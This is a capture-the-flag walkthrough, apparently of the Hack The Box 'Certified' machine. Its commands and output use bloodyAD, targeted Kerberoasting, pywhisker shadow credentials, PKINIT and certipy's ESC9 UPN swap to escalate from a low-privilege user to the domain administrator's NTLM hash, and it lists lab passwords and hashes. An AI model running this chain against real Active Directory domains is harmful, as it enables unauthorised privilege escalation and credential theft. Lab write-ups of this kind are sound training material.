bloodyAD -u "judith.mader" -p "judith09" -d "certified.htb" --host "10.10.11.41" add genericAll "Management" "judith.mader"    
[+] judith.mader has now GenericAll on Management

bloodyAD -u "judith.mader" -p "judith09" -d "certified.htb" --host "10.10.11.41" add groupMember "management" "judith.mader"
[+] judith.mader added to management

bloodyAD -u "judith.mader" -p "judith09" -d "certified.htb" --host "10.10.11.41" set object "management_svc" servicePrincipalName -v 'ops/whatever1'
[+] management_svc's servicePrincipalName has been updated


sudo systemctl stop systemd-timesyncd
sudo ntpdate 10.10.11.41
python3 targetedKerberoast.py -d CERTIFIED.HTB -u judith.mader -p judith09 --dc-ip 10.10.11.41
but we cant crack the hash

second method:
python3 pywhisker.py -d "CERTIFIED.HTB" -u "judith.mader" -p "judith09" --target "management_svc" --action add

python3 gettgtpkinit.py  -cert-pfx ../pywhisker/pywhisker/BKCx6zh0.pfx -pfx-pass Ta3lh8BvlRQmtnRzuIpl certified.htb/management_svc 123.ccache
2025-01-29 03:15:38,619 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-29 03:15:38,680 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-01-29 03:15:38,781 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-01-29 03:15:38,781 minikerberos INFO     16564e19e0f077dd6dc7987e4e1bf20326eea98e61306595bc7d2362aa535301
INFO:minikerberos:16564e19e0f077dd6dc7987e4e1bf20326eea98e61306595bc7d2362aa535301
2025-01-29 03:15:38,786 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

export KRB5CCNAME=/home/kali/Desktop/tools/PKINITtools/123.ccache
python3 getnthash.py -key 16564e19e0f077dd6dc7987e4e1bf20326eea98e61306595bc7d2362aa535301 certified.htb/management_svc
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584

change password for ca_operator
bloodyAD -u "management_svc" -p :a091c1832bcdd4677c28b5a6a1295584 -d "certified.htb" --host "10.10.11.41" set password "ca_operator" "12342134"

# CERTIPY
certipy find -u ca_operator@certified.htb -p 12342134  -vulnerable -enabled
[!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension

**exploit EC9**
certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
    
certipy req -username ca_operator@certified.htb -password 12342134 -ca certified-DC01-CA -template CertifiedAuthentication
[*] Saved certificate and private key to 'administrator.pfx'

certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
certipy auth -pfx administrator.pfx -domain certified.htb
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

that is, the chain is as follows: first, as user 1, we change the UAC of user 2 to Administrator, take the certificate from him for the administrator's UAC, then return the UAC of user 2 back, and only then can we request our certificate